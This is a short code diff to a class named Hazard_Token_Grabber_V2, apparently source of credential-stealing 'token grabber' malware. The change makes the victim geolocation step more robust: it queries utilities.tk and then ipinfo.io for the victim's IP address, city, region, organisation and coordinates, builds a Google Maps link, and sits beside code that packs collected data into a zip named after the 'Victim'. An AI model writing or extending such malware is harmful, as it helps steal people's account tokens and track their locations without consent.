@@ -921,14 +921,22 @@ class Hazard_Token_Grabber_V2(functions):
         org = "N/A"
         loc = "N/A"
         googlemap = "N/A"
-        data = httpx.get("https://ipinfo.io/json").json()
-        ip = data.get('ip')
-        city = data.get('city')
-        country = data.get('country')
-        region = data.get('region')
-        org = data.get('org')
-        loc = data.get('loc')
-        googlemap = "https://www.google.com/maps/search/google+map++" + loc
+        for site in ["https://utilities.tk/network/info", "https://ipinfo.io/json"]:
+            try:
+                data = httpx.get(site).json()
+                try:
+                    ip = data.get('ip')
+                    city = data.get('city')
+                    country = data.get('country')
+                    region = data.get('region')
+                    org = data.get('org')
+                    loc = data.get('loc')
+                    googlemap = "https://www.google.com/maps/search/google+map++" + loc
+                    break
+                except Exception:
+                    pass
+            except Exception:
+                pass
 
         _zipfile = os.path.join(
             self.appdata, f'Hazard.V2-[{Victim}].zip')
